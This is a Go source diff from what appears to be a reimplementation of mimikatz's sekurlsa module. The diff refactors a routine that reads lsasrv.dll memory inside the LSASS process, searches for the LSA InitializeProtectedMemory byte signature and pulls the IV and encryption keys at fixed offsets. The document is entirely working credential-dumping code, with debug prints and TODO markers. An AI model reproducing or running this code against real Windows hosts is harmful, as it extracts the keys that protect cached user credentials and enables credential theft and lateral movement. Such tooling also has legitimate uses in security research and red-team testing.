@@ -13,8 +13,9 @@ import (
 )
 
 var (
-	win10LSAInitializeProtectedMemoryKey = []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8D,
-		0x45, 0xE0, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8D, 0x15} // 67, -89, 16
+	win10LSAInitializeProtectedMemoryKey = []byte{
+		0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8D, 0x45, 0xE0, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8D, 0x15,
+	} // 67, -89, 16
 )
 
 type bcryptHandleKey struct {
@@ -47,9 +48,16 @@ type hardKey struct {
 	data     [4]byte // self append
 }
 
-func (kiwi *Kiwi) searchMemory(pHandle windows.Handle, address uintptr, length int) error {
-	memory := make([]byte, length)
-	_, err := api.ReadProcessMemory(pHandle, address, &memory[0], uintptr(length))
+func (kiwi *Kiwi) requireNT6LSAKeys(pHandle windows.Handle) error {
+	kiwi.mu.Lock()
+	defer kiwi.mu.Unlock()
+
+	lsasrv, err := kiwi.getLSASSBasicModuleInfo(pHandle, "lsasrv.dll")
+	if err != nil {
+		return err
+	}
+	memory := make([]byte, lsasrv.size)
+	_, err = api.ReadProcessMemory(pHandle, lsasrv.address, &memory[0], uintptr(lsasrv.size))
 	if err != nil {
 		return errors.WithMessage(err, "failed to search memory")
 	}
@@ -61,7 +69,7 @@ func (kiwi *Kiwi) searchMemory(pHandle windows.Handle, address uintptr, length i
 	// https://github.com/gentilkiwi/mimikatz/blob/fe4e98405589e96ed6de5e05ce3c872f8108c0a0/
 	// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
 
-	address2 := address + uintptr(index) + 67 // TODO off0
+	address2 := lsasrv.address + uintptr(index) + 67 // TODO off0
 	fmt.Printf("5, %X\n", address2)
 
 	var offset2 uint32
@@ -80,10 +88,10 @@ func (kiwi *Kiwi) searchMemory(pHandle windows.Handle, address uintptr, length i
 	}
 	fmt.Println(iv)
 
-	address3 := address + uintptr(index) - 89 // TODO off1
+	address3 := lsasrv.address + uintptr(index) - 89 // TODO off1
 	fmt.Printf("7, %X\n", address3)
-	kiwi.nt6RequireKey(pHandle, address+uintptr(index)-89)
-	address3 = address + uintptr(index) + 16 // TODO off2
+	kiwi.nt6RequireKey(pHandle, lsasrv.address+uintptr(index)-89)
+	address3 = lsasrv.address + uintptr(index) + 16 // TODO off2
 	fmt.Printf("7, %X\n", address3)
 	kiwi.nt6RequireKey(pHandle, address3)
 	return nil
